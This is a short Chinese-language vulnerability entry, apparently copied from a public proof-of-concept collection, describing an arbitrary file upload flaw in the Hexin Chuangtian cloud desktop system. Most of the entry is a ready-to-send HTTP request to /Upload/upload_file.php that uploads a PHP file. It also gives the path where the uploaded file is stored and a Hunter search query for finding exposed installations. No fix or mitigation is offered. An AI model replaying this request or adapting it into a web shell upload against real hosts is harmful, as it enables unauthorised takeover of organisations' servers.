# 和信创天云桌面系统upload_file存在任意文件上传

# 一、漏洞简介
和信创天专注虚拟化云计算领域，为首家集VOI/VDI/IDV于一体的云桌面厂家,助力教育、医疗、政企、军工、电力、金融等行业客户实现千台终端统一管理,确保数据安全与业务连续性。和信下一代云桌面基于VDI/VOI/IDV三种技术架构优势，对于用户应用场景有着普遍的适用性，前后端混合计算保证在调度服务器后端资源的同时，也能充分利用前端计算资源，高性能的电脑和低功耗的瘦终端均能流畅地运行各种操作系统与应用软件，能够轻松实现千点以上大规模终端的集中管理。和信创天云桌面系统upload_file存在任意文件上传，攻击者可通过该漏洞获取服务器权限。

# 二、影响版本
+ 和信创天云桌面系统

# 三、资产测绘
+ hunter`web.body="和信下一代云桌面"`
+ 特征


# 四、漏洞复现
```python
POST /Upload/upload_file.php?l=1 HTTP/1.1
Host: xx.xx.xx.xx
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36
Accept: image/avif,image/webp,image/apng,image/*,*/*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,fil;q=0.8
Cookie: think_language=zh-cn; PHPSESSID_NAMED=h9j8utbmv82cb1dcdlav1cgdf6
Connection: close
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryfcKRltGv
Content-Length: 192

------WebKitFormBoundaryfcKRltGv
Content-Disposition: form-data; name="file"; filename="test.php"
Content-Type: image/avif

<?php phpinfo(); ?>
------WebKitFormBoundaryfcKRltGv--
```


上传文件位置

```python
/Upload/1/test.php
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/im6hi1mdzqn6l81q>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
